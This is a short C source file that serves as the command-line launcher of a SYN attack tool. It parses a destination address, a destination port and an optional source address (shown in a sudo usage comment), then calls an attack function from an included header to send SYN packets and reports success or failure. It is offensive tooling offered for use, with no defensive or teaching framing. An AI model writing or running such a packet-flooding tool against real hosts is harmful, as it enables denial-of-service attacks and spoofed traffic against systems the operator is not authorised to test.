#include "syn_attack.h"




int main(int argc, char ** argv)
{
       /**
        *  Usage:
        *  sudo  ./asyn --s-addr=127.0.0.1 --d-port=80 --d-addr=0.0.0.0.0
        */ 
        
      char  * s_addr = "127.0.0.1";
      char  * d_addr = NULL;
      int d_port = 0; 

      char *temp;
      if (argc == 3 || argc == 4)
      {
            for (int i = 1; i < argc; i++)
            {
                  if ((temp = strtok(argv[i], "=")) != NULL)
                  {
                       if (strcmp(temp, "--d-port") == 0)
                       {
                             d_port =  atoi(strtok(NULL, "="));
                       }
                       else if (strcmp(temp, "--d-addr") == 0)
                       {
                             d_addr = strtok(NULL, "=");
                       }
                       else if (strcmp(temp, "--s-addr") == 0)
                       {
                             s_addr = strtok(NULL, "=");
                       }
                       else
                       {
                             printf("Error: Invalid argument: %s\n", temp);
                             return 0;
                       }
                       
                  }
            }
             
      }
      
      else
      {
            printf("Error: Invalid argument\n");
            return 0;
      }
      
      printf("Source address: %s, distination address: %s, distination port: %d\n", s_addr, d_addr, d_port);
      if (syn_attack_sock(d_addr, s_addr, d_port) < 0)
            printf("Syn packet send failed\n");
      else printf("Syn packet send success\n");
      
      return 0;
}


